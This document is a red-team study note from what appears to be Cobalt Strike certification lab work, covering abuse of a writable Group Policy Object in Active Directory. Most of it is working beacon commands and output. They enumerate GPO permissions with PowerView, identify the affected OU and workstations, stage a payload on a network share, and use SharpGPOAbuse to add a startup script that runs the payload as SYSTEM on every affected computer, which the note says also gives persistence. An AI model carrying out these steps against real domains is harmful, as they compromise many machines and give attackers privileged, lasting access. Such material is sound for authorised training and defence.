
Modifying an existing GPO that is already applied to one or more OUs is the most straightforward scenario.

#### 🖊️ What we need

1) Enumerate all environment GPO's
2) Check ACL of each one
3) Filter for properties CreateChild, WriteProperty, GenericWrite
4) Filter out SYSTEM, Domain Admins, Enterprise


#### 📔 via Cobalt Strike

1) Let's enumerate the GPO's using Get-DomainGPO and Get-DomainObjectAcl

```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

AceType               : AccessAllowed
ObjectDN              : CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : 
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask            : 131127
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

2) Analyze the results you get checking the GPO name and the SID of the principal

```
beacon> powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

displayname    gpcfilesyspath                                                                              
-----------    --------------                                                                              
Vulnerable GPO \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

In this example, this shows us that members of the "Developers" group can modify "Vulnerable GPO".

3) We also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs.  GPOs are linked to an OU by modifying the `gPLink` property of the OU itself.  The `Get-DomainOU` cmdlet has a handy `-GPLink` parameter which takes a GPO GUID.

```
beacon> powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

distinguishedname                         
-----------------                         
OU=Workstations,DC=dev,DC=cyberbotic,DC=io
```

4) Finally, to get the computers in an OU, we can use `Get-DomainComputer` and use the OU's distinguished name as a search base.

```
beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```

5) To modify a GPO without the use of GPMC (Group Policy Management Console), we can modify the associated files directly in SYSVOL (the gpcFileSysPath).

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     09/07/2022 12:40:22   Machine
          dir     09/07/2022 12:40:22   User
 59b      fil     09/07/2022 12:40:22   GPT.INI
```

6) But first, think ahead of the strategy you'll use to abuse this access. The GPO will be executed with SYSTEM privs so you may want to execute a beacon payload for example. 

Another tip is finding out open shares in the environment that machines may have access to (and execute paylods from there):

```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```

`beacon> powershell Copy-Item -Path "C:\payloads\evildns.exe" -Destination "\\Server\Share\folder\" `

7) Using this example, we'll upload a payload to a share folder and tell the GPO to execute it, We can do that manually or use an automated tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), which has several abuses built into it to overwrite the GPO.

Here's an example using a Computer Startup Script.  It will put a startup script in SYSVOL that will be executed each time an effected computer starts (which incidentally also acts as a good persistence mechanism).

```
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "Vulnerable GPO" is: {5059FAC1-5E94-4361-95D3-3BB235A23928}
[+] Creating new startup script...
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.
[+] Done!
```

8) Finally run gpupdate /force and wait (in this example a reboot will activate the command)

![[beacons.png]]



#### ⚠ Opsec


### Properties
---
📆 created   {{20-02-2024}} 20:17
🏷️ tags: #redteam #crto 

---

